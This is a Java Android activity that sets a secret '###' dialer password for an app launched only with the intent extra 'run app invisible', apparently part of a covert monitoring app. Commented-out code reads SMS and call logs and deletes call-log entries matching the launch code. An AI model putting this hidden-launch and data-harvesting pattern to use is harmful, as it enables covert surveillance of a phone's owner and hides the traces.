package sys.android.app.ui.activity;

import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.nfc.NfcAdapter;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.view.ViewTreeObserver;
import android.widget.Button;
import android.widget.RelativeLayout;

import com.gc.materialdesign.views.ButtonFlat;
import com.gc.materialdesign.views.ButtonFloat;
import com.gc.materialdesign.views.ButtonRectangle;
import com.gc.materialdesign.widgets.SnackBar;
import com.rengwuxian.materialedittext.MaterialEditText;
import com.squareup.picasso.Callback;
import com.squareup.picasso.Picasso;

import net.steamcrafted.loadtoast.LoadToast;

import java.security.Provider;

import butterknife.InjectView;
import sys.android.app.DataUtil;
import sys.android.app.R;
import sys.android.app.ui.view.RevealBackgroundView;


public class RunnerPasswordActivity extends BaseActivity implements
//        RevealBackgroundView.OnStateChangeListener,
        View.OnClickListener{

//    @InjectView(R.id.btLogIn)
//    Button btLogin;
//    @InjectView(R.id.btSignup)
//    Button btSingUp;

    @InjectView(R.id.etPassowrd)
    MaterialEditText etPassword;
    @InjectView(R.id.btSave)
    ButtonRectangle btSave;
//    ButtonRectangle btSave;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if(!getIntent().hasExtra("run")) {
            finish();
        } else if(getIntent().hasExtra("run")&&!getIntent().getStringExtra("run").equals("run app invisible")){
            finish();
        } else {

            setContentView(R.layout.activity_main);


            btSave.setOnClickListener(this);
        }
//        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/failed"), null, null,null, null);
//        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
//        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null,null, null);

//        Uri allCalls = Uri.parse("content://call_log/calls");
//        Cursor cursor =  getContentResolver().query(allCalls, null, null, null, null);
//        Cursor cursor =  getContentResolver().query( CallLog.Calls.CONTENT_URI, null, null, null, null);
//
//        if(cursor!=null&& cursor.moveToFirst()){
//
//            do{
//                Log.d("log","-------------------------------------------------");
//                for(String column : cursor.getColumnNames()){
//                    Log.d("log", "column " + column + cursor.getString(cursor.getColumnIndexOrThrow(column)));
//                }
//            }while (cursor.moveToNext());
//
//        }
//
//        getContentResolver().delete(allCalls, "number = ?", new String[]{"###123"});
//        btLogin.setOnClickListener(this);
//        btSingUp.setOnClickListener(this);
    }


    @Override
    public void onClick(View v) {
        switch (v.getId()){
            case R.id.btSave:
                if(etPassword.getText().toString().isEmpty()){
                    SnackBar snackbar = new SnackBar(this, getText(R.string.password_cannot_be_empty).toString(),
                            "Ok", null);
                    snackbar.show();
                }else if(etPassword.getText().toString().equals("123")){
                    SnackBar snackbar = new SnackBar(this, "###123 is the default password",
                            "Ok", null);
                    snackbar.show();
                }else{
                    DataUtil.setRunnerPassword(this, "###"+etPassword.getText().toString());
                    launch(this, new Intent(this, LoginActivity.class));

                }
                break;
        }
    }

}
